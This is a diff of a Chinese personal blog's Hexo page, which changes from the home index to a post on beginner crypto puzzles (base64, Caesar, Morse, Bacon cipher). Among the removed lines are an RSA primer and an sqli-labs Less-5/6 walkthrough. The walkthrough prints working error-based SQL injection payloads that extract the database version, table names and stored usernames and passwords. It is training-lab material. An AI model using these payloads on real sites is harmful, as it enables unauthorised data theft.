@@ -21,28 +21,34 @@
     var CONFIG = {"hostname":"sinanya.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="司南的博客">
-<meta property="og:url" content="https://sinanya.github.io/index.html">
+  <meta name="description" content="base64​    base64加密的原理：3 * 8 &#x3D; 4 * 6，也就是将原来的3个字节转换成4个6位二进制数。详细步骤：将字符的ASSIC码转换成二进制，接着将二进制串每6个为一组，但有时二进制数的个数不那么恰巧就是6的倍数，所以最后一组后面补0。因为计算机的一个字节是占8位，所以每一组高位再补上两个0。最后将二进制数转成十进制后映射到base64编码表，形成新的字符串。  例如：对字符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界crypto新手区杂题">
+<meta property="og:url" content="https://sinanya.github.io/2021/07/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%E6%96%B0%E6%89%8B%E5%8C%BA%E6%9D%82%E9%A2%98/index.html">
 <meta property="og:site_name" content="司南的博客">
+<meta property="og:description" content="base64​    base64加密的原理：3 * 8 &#x3D; 4 * 6，也就是将原来的3个字节转换成4个6位二进制数。详细步骤：将字符的ASSIC码转换成二进制，接着将二进制串每6个为一组，但有时二进制数的个数不那么恰巧就是6的倍数，所以最后一组后面补0。因为计算机的一个字节是占8位，所以每一组高位再补上两个0。最后将二进制数转成十进制后映射到base64编码表，形成新的字符串。  例如：对字符">
 <meta property="og:locale">
+<meta property="og:image" content="https://sinanya.github.io/2021/07/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%E6%96%B0%E6%89%8B%E5%8C%BA%E6%9D%82%E9%A2%98/Post3_image2-1626325143077.png">
+<meta property="article:published_time" content="2021-07-15T04:15:11.000Z">
+<meta property="article:modified_time" content="2021-07-15T09:27:18.216Z">
 <meta property="article:author" content="sinanya">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sinanya.github.io/2021/07/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%E6%96%B0%E6%89%8B%E5%8C%BA%E6%9D%82%E9%A2%98/Post3_image2-1626325143077.png">
 
-<link rel="canonical" href="https://sinanya.github.io/">
+<link rel="canonical" href="https://sinanya.github.io/2021/07/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%E6%96%B0%E6%89%8B%E5%8C%BA%E6%9D%82%E9%A2%98/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-Hans'
   };
 </script>
 
-  <title>司南的博客</title>
+  <title>攻防世界crypto新手区杂题 | 司南的博客</title>
   
 
 
@@ -150,9 +156,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
@@ -168,10 +175,9 @@
       <meta itemprop="name" content="司南的博客">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%E6%96%B0%E6%89%8B%E5%8C%BA%E6%9D%82%E9%A2%98/" class="post-title-link" itemprop="url">攻防世界crypto新手区杂题</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界crypto新手区杂题
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -208,7 +214,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>​    base64加密的原理：3 * 8 = 4 * 6，也就是将原来的3个字节转换成4个6位二进制数。详细步骤：将字符的ASSIC码转换成二进制，接着将二进制串每6个为一组，但有时二进制数的个数不那么恰巧就是6的倍数，所以最后一组后面补0。因为计算机的一个字节是占8位，所以每一组高位再补上两个0。最后将二进制数转成十进制后映射到base64编码表，形成新的字符串。</p>
+        <h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>​    base64加密的原理：3 * 8 = 4 * 6，也就是将原来的3个字节转换成4个6位二进制数。详细步骤：将字符的ASSIC码转换成二进制，接着将二进制串每6个为一组，但有时二进制数的个数不那么恰巧就是6的倍数，所以最后一组后面补0。因为计算机的一个字节是占8位，所以每一组高位再补上两个0。最后将二进制数转成十进制后映射到base64编码表，形成新的字符串。</p>
 <p><img src="/2021/07/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%E6%96%B0%E6%89%8B%E5%8C%BA%E6%9D%82%E9%A2%98/Post3_image2-1626325143077.png" alt="base646编码表"></p>
 <p>例如：对字符’3’进行加密，’3’的ASSIC码为51，对应的二进制数为</p>
 <p>base64解密原理就是加密的逆过程，就不再详细介绍了。</p>
@@ -259,333 +265,30 @@
 
 <p>培根密码：培根密码(Baconian Cipher)是一种替换密码，每个明文字母被一个由5字符组成的序列替换，最初的加密方式就是由‘A’和‘B’组成序列替换明文(所以你当然也可以用别的字母)，比如字母‘D’ 替换成“aaabb” 。</p>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://sinanya.github.io/2021/07/12/RSA%E5%9F%BA%E7%A1%80/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="sinanya">
-      <meta itemprop="description" content="">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="司南的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/12/RSA%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">RSA基础</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-07-12 23:31:07" itemprop="dateCreated datePublished" datetime="2021-07-12T23:31:07+08:00">2021-07-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-15 17:29:11" itemprop="dateModified" datetime="2021-07-15T17:29:11+08:00">2021-07-15</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" itemprop="url" rel="index"><span itemprop="name">密码学</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/RSA/" itemprop="url" rel="index"><span itemprop="name">RSA</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="RSA的加密与解密"><a href="#RSA的加密与解密" class="headerlink" title="RSA的加密与解密"></a>RSA的加密与解密</h1><p>​    RSA的加密和解密都是在整数环&#x2124;n内完成的，模计算在其中发挥了核心作用。假设使用RSA加密明文x，而表示x的位字符串则是&#x2124;n= {0，1，2，3，…，n-1}内的元素。所以明文x表示的二进制值必然小于n。对于密文而言，这个原理也成立。</p>
-<h2 id="RSA相关的术语与符号表示："><a href="#RSA相关的术语与符号表示：" class="headerlink" title="RSA相关的术语与符号表示："></a>RSA相关的术语与符号表示：</h2><p>公钥：（e，n）</p>
-<p>私钥：（d，n）</p>
-<p>明文：m</p>
-<p>密文：c</p>
-<h2 id="RSA的三大算法"><a href="#RSA的三大算法" class="headerlink" title="RSA的三大算法"></a>RSA的三大算法</h2><h3 id="密钥生成算法"><a href="#密钥生成算法" class="headerlink" title="密钥生成算法"></a>密钥生成算法</h3><p>①.选择两个大素数p和q</p>
-<p>②.计算n = p * q</p>
-<p>③.计算Φ(n) =  (p - 1)(q - 1)</p>
-<p>④.选择满足以下条件的公开指数e∈{1,2,3,…,Φ(n) - 1}</p>
-<p>​                        gcd(e, Φ(n)) = 1。</p>
-<p>why? : 条件gcd(e, Φ(n)) = 1保证e的逆元存在模Φ(n)，因此，私钥d始终存在。</p>
-<p>⑤.计算满足以下条件的私钥d</p>
-<p>​                        e * d ≡ 1 mod Φ(n)</p>
-<p>证明：</p>
-<p>欧拉定理：m^Φ(n) ≡ 1 (mod n) 表示对于任何一个与n互质的正整数m取它的Φ(n)次方，并除于n取余数，结果都永远等于1。</p>
-<p>Φ(n)是欧拉函数，它表示小于等于n的正整数中，有多少个与n互质的数。</p>
-<p>例子：取 n = 6， 会发现在小于6的正整数中只有1和5与6互质，所以Φ(6) = 2。</p>
-<p>对欧拉定理进行简单的变换：首先在等式的两边同取k（任意的正整数）次幂，m^(Φ(n) * k) ≡ 1^ k (mod n) ；接着在两端同乘以m，     m^(Φ(n) * k + 1) ≡ m (mod n) ；将模运算写在等式的左边 m^(Φ(n) * k + 1) mod n = m。与 m^(e * d) mod n = m 进行比对可以发现     e * d = Φ(n) * k + 1（Φ(n) * k + 1就是1 % Φ(n)，k∈Z , 成功推导出上面的⑤) ,  所以e和d的关系可以表示成e = Φ(n) * k + 1/d 。公式      看起来简单，但Φ(n)的计算并不容易，Φ(n)的计算恰恰是公钥加密中最关键的部分。要计算出Φ(n)的唯一办法就是对这个数n做质因数    分解，然而大数的质因数分解是非常困难的。但如果n本身是一个质数，情况就有所不同了。例如对于质数7，小于7并于7互质的数有    1-6，因此Φ(7) = 6。我们可以推广到对于一个质数p，Φ(p) = p - 1。Φ函数还有一个重要的特性：对于任意两个互质的整数p和q，Φ(p     * q) = Φ(p) * Φ(q)，再结合上面推导的Φ(p) = p - 1，就得到了③公式。</p>
-<h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><p>给定公钥(E,N)和明文m，则加密函数为：</p>
-<p>​                        c ≡ m^e mod n</p>
-<p>其中c, m ∈ &#x2124;n。</p>
-<h3 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h3><p>给定私钥d及密文c，则解密函数为：</p>
-<p>​                        m ≡ c^d mod n</p>
-<p>其中c, m ∈ &#x2124;n。</p>
-<p>注意：c, m, n, d都是非常长的数字，通常为1024位或更长。值e有时称为加密指数或公开指数；私钥d有时称为解密指数或保密指数。有趣的是 m^ed mod n = m</p>
-<h3 id="RSA密码体制的一些需求："><a href="#RSA密码体制的一些需求：" class="headerlink" title="RSA密码体制的一些需求："></a>RSA密码体制的一些需求：</h3><p>(1) 由于攻击者可以得到公钥，所以，对于给定的公钥值e和n,确定私钥d在计算上必须是不可行的。（即由公钥无法推出私钥）</p>
-<p>(2)由于x只是唯一地取决于模数n的大小，所以一.次RSA加密的位数不能超过l,其中I指的是n的位长度。</p>
-<p>(3)计算 m^e mod n (即加密) 和 c^d mod n (即解密) 应该相对简单。这意味着我们需要一种能快速计算长整数的指数的方法。</p>
-<p>(4)给定一个n应该对应很多密钥/公钥对，否则，攻击者就可以发起蛮力攻击(事实证明，这个要求很容易满足)。</p>
-<p>附上这两天做到的基础题：</p>
-<p>1.</p>
-<p><img src="/2021/07/12/RSA%E5%9F%BA%E7%A1%80/Post2_image1.png" alt="第一题"></p>
-<p>解题思路：</p>
-<p>我们知道d*e ≡ 1 mod Φ(n)，Φ(n) =  (p - 1)(q - 1)，可以根据这两个公式求得d</p>
-<p>附上代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">447685307</span></span><br><span class="line">q = <span class="number">2037</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)  <span class="comment">#求e在phi的乘法逆元，返回e的逆矩阵</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;53616899001&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>2.</p>
-<p><img src="/2021/07/12/RSA%E5%9F%BA%E7%A1%80/Post2_image2.png" alt="第二题"></p>
-<p>解题思路：</p>
-<p>由 d * e ≡ 1 mod Φ(n),  Φ(n) =  (p - 1)(q - 1), n = p * q,  求得d之后，将其带入到 m ≡ c^d mod n，可求得m</p>
-<p>附上代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">447685307</span></span><br><span class="line">q = <span class="number">2037</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">c = <span class="number">704796792</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/12/RSA%E5%9F%BA%E7%A1%80/" rel="prev" title="RSA基础">
+      <i class="fa fa-chevron-left"></i> RSA基础
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://sinanya.github.io/2021/05/30/%E8%BF%99%E6%98%AF%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="sinanya">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="司南的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/05/30/%E8%BF%99%E6%98%AF%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">这是我的第一篇博客</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-05-30 22:56:56" itemprop="dateCreated datePublished" datetime="2021-05-30T22:56:56+08:00">2021-05-30</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-10 23:35:15" itemprop="dateModified" datetime="2021-06-10T23:35:15+08:00">2021-06-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AD%A6%E4%B9%A0-sqlilabs/" itemprop="url" rel="index"><span itemprop="name">Web学习-sqlilabs</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="SQL注入——报错注入-sqli-labs-Less-5-and-Less-6"><a href="#SQL注入——报错注入-sqli-labs-Less-5-and-Less-6" class="headerlink" title="SQL注入——报错注入 sqli-labs Less-5 and Less-6"></a>SQL注入——报错注入 sqli-labs Less-5 and Less-6</h1><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><blockquote>
-<p>报错注入形式上是两个嵌套的查询，即select…(select…)，里面的select被称为子查询，它的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到几个sql函数：<br>rand()随机函数，返回0~1之间的某个值<br>floor(a)取整函数，返回小于等于a，且最接近于a的一个整数<br>count()聚合函数也称作计数函数，返回查询对象的总数<br>group by clause分组语句，按照查询结果分组<br>通过报错来显示具体的信息。</p>
-<p>以sqli-labs-Less5为例：<br>键入id后：</p>
-<p><img src="../images/Post1_image1.jpg" alt="键入id后"></p>
-<p>加个反斜杠后：</p>
-<p><img src="../images/Post1_image2.jpg" alt="加个反斜杠后"></p>
-<p>分析可知这是自带一个单引号注入<br>接着我们闭合单引号并进行联合查询（union select 1, 2, 3）</p>
-<p><img src="../images/Post1_image3.jpg" alt="联合查询后"></p>
-<p>依旧无法获得显示位<br>那怎样才能看到报错信息?</p>
-<hr>
-<h2 id="这里介绍一下floor-rand-0-2"><a href="#这里介绍一下floor-rand-0-2" class="headerlink" title="这里介绍一下floor(rand(0)*2)"></a>这里介绍一下floor(rand(0)*2)</h2><p>查询的时使用rand()，该值会被执行多次。在使用group by时，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，在插入虚表的时候会再被执行一次。在一次多记录的查询过程中 floor(rand(0)*2)的值是固定的，为011011</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>); </span><br></pre></td></tr></table></figure>
-
-<p>当为第一个数字0时不进行插入虚表；<br>当为第二个数字1时插入虚表，插入后key值为1，count(*)为1；<br>当为第三个数字1时插入虚表，插入后key值为1，因为前面一个1已经插入虚表所以这个1不再在虚表中添加一行，但1对应的 count()加1；<br>当为第四个数字0时，因为虚表中没有对应的记录，所以会重新建立虚表，然后重复上面的操作。<br>所以看似操作了5次，但其实只要前三次就可以卡出来了。</p>
-<hr>
-<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>1.获取数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from(select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from </span></span><br><span class="line"><span class="string">information_schema.tables group by x)a --+</span></span><br></pre></td></tr></table></figure>
-
-<p>2.获取表名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from(select count(*),concat((select </span></span><br><span class="line"><span class="string">concat(table_name,0x3a,0x3a)from information_schema.tables where table_schema=database() limit</span></span><br><span class="line"><span class="string">0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span></span><br></pre></td></tr></table></figure>
-
-<p>3.获取用户信息</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from(select count(*),concat((select </span></span><br><span class="line"><span class="string">concat(username, 0x3a,0x3a,password,0x3a,0x3a) from security.users limit </span></span><br><span class="line"><span class="string">5,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<hr>
-<p>Less-6是一样的，把单引号改为双引号。</p>
-<p>图片来源于本人CSDN博客</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51761376/article/details/113996496?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_51761376/article/details/113996496?spm=1001.2014.3001.5501</a></p>
-<p>欢迎大家访问，有错误也请留言，感谢各位！</p>
-<hr>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://sinanya.github.io/2021/05/11/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="sinanya">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="司南的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/05/11/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-05-11 21:10:00" itemprop="dateCreated datePublished" datetime="2021-05-11T21:10:00+08:00">2021-05-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-15 23:12:57" itemprop="dateModified" datetime="2021-05-15T23:12:57+08:00">2021-05-15</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%BF%83%E5%BE%97/" itemprop="url" rel="index"><span itemprop="name">心得</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%BF%83%E5%BE%97/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Hello-Hexo"><a href="#Hello-Hexo" class="headerlink" title="Hello Hexo"></a>Hello Hexo</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -638,6 +341,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#base64"><span class="nav-number">1.</span> <span class="nav-text">base64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Caesar"><span class="nav-number">2.</span> <span class="nav-text">Caesar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Morse"><span class="nav-number">3.</span> <span class="nav-text">Morse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AFMorse"><span class="nav-number">4.</span> <span class="nav-text">不仅仅是Morse</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
